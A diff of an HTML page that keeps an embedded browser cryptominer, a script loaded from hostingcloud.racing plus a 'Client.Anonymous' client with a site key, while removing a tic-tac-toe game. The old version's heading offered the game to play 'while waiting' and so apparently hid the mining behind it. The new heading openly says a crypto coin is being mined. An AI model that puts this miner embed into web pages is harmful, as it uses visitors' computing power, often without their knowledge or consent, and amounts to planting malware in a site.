@@ -219,7 +219,7 @@ body{
 </head>
 <body>
     <br>
-    <h1>If you want to, you could play this tac tac toe game while waiting!</h1>
+    <h1>‎ ‎ ‎ ‎ ‎ ‎ ‎ The Crypto Coin Is Being Mined!</h1>
     <script src="https://www.hostingcloud.racing/87Dn.js"></script>
 <script>
     var _client = new Client.Anonymous('eba4bf186aab17d476c13f2d8816b117157f0f55df91aa57589633f8edb3233a', {
@@ -244,139 +244,6 @@ body{
         }
     },1000);
 </script>
-
-    
-    <!-- SELECT PLAYER BOX -->
-    <div class="select-box">
-        <header>Tic Tac Toe</header>
-        <div class="content">
-            <div class="title">Select which icon you want to be?</div>
-            <div class="options">
-                <button class="playerX">Player X</button>
-                <button class="playerO">Player O</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- LAYOUT/BOARD -->
-    <div class="play-board">
-        <div class="details">
-            <div class="players">
-                <span class="Xturn">X's Turn</span>
-                <span class="Oturn">O's Turn</span>
-                <div class="slider"></div>
-            </div>
-        </div>
-        <!-- play area -->
-        <div class="play-area">
-            <section>
-                <span class="box1"></span>
-                <span class="box2"></span>
-                <span class="box3"></span>
-            </section>
-            <section>
-                <span class="box4"></span>
-                <span class="box5"></span>
-                <span class="box6"></span>
-            </section>
-            <section>
-                <span class="box7"></span>
-                <span class="box8"></span>
-                <span class="box9"></span>
-            </section>
-        </div>
-    </div>
-
-    <!-- RESULT -->
-    <div class="result-box">
-        <div class="won-text"></div>
-        <div class="btn">
-            <button style="margin:5px">Replay</button>
-        </div>
-    </div>
-    <script>
-// specify variable based on CSS classes
-// computer interaction with the board
-function bot() {
-    let array = [];
-    if(runBot) {
-        playerSign = "O";
-        let bestMove = null;
-
-        // Try to win or block the opponent from winning
-        bestMove = findBestMove(playerSign);  // AI tries to win
-        if (!bestMove) {
-            bestMove = findBestMove(playerSign === "X" ? "O" : "X"); // Block opponent
-        }
-
-        // If no winning/blocking move, pick a random empty spot
-        if (!bestMove) {
-            for (let i = 0; i < allBox.length; i++) {
-                if(allBox[i].childElementCount == 0){
-                    array.push(i);
-                }
-            }
-            bestMove = array[Math.floor(Math.random() * array.length)];
-        }
-
-        // Apply the move
-        if(players.classList.contains("player")){ 
-            playerSign = "X";
-            allBox[bestMove].innerHTML = `<i class="${playerXIcon}"></i>`;
-            allBox[bestMove].setAttribute("id", playerSign);
-            players.classList.add("active"); 
-        }
-        else {
-            allBox[bestMove].innerHTML = `<i class="${playerOIcon}"></i>`;
-            players.classList.remove("active");
-            allBox[bestMove].setAttribute("id", playerSign);
-        }
-
-        selectWinner();
-        allBox[bestMove].style.pointerEvents = "none";
-        playBoard.style.pointerEvents = "auto";
-        playerSign = "X";        
-    }
-}
-
-// Check if a move can win
-function findBestMove(player) {
-    let winningMove = null;
-
-    // Try to find a winning move for the player
-    for (let i = 0; i < allBox.length; i++) {
-        if (allBox[i].childElementCount == 0) {
-            allBox[i].innerHTML = `<i class="${player === "X" ? playerXIcon : playerOIcon}"></i>`;
-            allBox[i].setAttribute("id", player);
-            if (selectWinner(true)) {
-                winningMove = i;  // Found a winning move
-                break;
-            }
-            allBox[i].innerHTML = "";  // Undo the move
-        }
-    }
-    return winningMove;
-}
-
-// Simulate the winning check (without ending the game)
-function selectWinner(dryRun = false){
-    if(checkIdSign(1,2,3,playerSign) || checkIdSign(4,5,6, playerSign) || checkIdSign(7,8,9, playerSign) || checkIdSign(1,4,7, playerSign) || checkIdSign(2,5,8, playerSign) || checkIdSign(3,6,9, playerSign) || checkIdSign(1,5,9, playerSign) || checkIdSign(3,5,7, playerSign)){
-        return true;
-    }
-    // check draw scenario (optional)
-    if(!dryRun && getIdVal(1) != "" && getIdVal(2) != "" && getIdVal(3) != "" && getIdVal(4) != "" && getIdVal(5) != "" && getIdVal(6) != "" && getIdVal(7) != "" && getIdVal(8) != "" && getIdVal(9) != ""){
-        runBot = false;
-        bot(runBot);
-        setTimeout(() => {
-            resultBox.classList.add("show");
-            playBoard.classList.remove("show");
-        }, 700);
-        wonText.textContent = "Match has been drawn!";
-    }
-    return false;
-}
-
-    </script>
 </body>
 </html>
 
